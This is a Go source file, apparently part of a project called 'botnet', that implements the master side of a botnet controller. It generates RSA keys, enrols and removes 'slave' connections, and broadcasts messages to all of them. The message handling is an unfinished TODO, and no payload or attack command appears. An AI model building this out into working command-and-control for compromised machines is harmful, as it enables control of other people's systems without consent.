package master

import (
	"crypto/rsa"
	"log"

	"github.com/adrianosela/botnet/lib/encryption"
)

// Master handles all communication between master and slaves
type Master struct {
	masterPrivKey  *rsa.PrivateKey
	masterPubKey   string
	receiveMsgChan chan *Msg // Channel for receiving de-crypted messages requests
	slaves         map[string]*SlaveCtrl
}

// NewMaster is the constructor for a Master
func NewMaster() (*Master, error) {
	priv, pub, err := encryption.GenerateRSAKeyPair()
	if err != nil {
		return nil, err
	}
	log.Printf("[master] public key: \n%s", string(pub))
	return &Master{
		masterPrivKey:  priv,
		masterPubKey:   string(pub),
		receiveMsgChan: make(chan *Msg),
		slaves:         make(map[string]*SlaveCtrl),
	}, nil
}

// Start begins communication
func (m *Master) Start() {
	for {
		select {
		// handle the next message
		case msg := <-m.receiveMsgChan:
			m.handleMessage(msg)
		}
	}
}

// EnrolSlave registers a slave to the botnet
func (m *Master) EnrolSlave(slave *SlaveCtrl) {
	m.slaves[slave.id] = slave
	log.Printf("[%s] joined net", slave.id)
	go slave.writer()
	go slave.reader()
}

// DeregisterSlave deregisters a slave from a botnet
func (m *Master) DeregisterSlave(slaveID string) {
	if slave, ok := m.slaves[slaveID]; ok {
		delete(m.slaves, slaveID)
		close(slave.MsgChan)
	}
	log.Printf("[%s] left net", slaveID)
}

func (m *Master) handleMessage(msg *Msg) {
	//TODO
	log.Println(msg.String())
}

func (m *Master) broadcastMessage(msg *Msg) {
	log.Printf("[MASTER] broadcasting message to %d slaves\n", len(m.slaves))
	for slaveID := range m.slaves {
		select {
		case m.slaves[slaveID].MsgChan <- msg:
		default:
			close(m.slaves[slaveID].MsgChan)
			delete(m.slaves, slaveID)
			log.Printf("[%s] left net", slaveID)
		}
	}
}
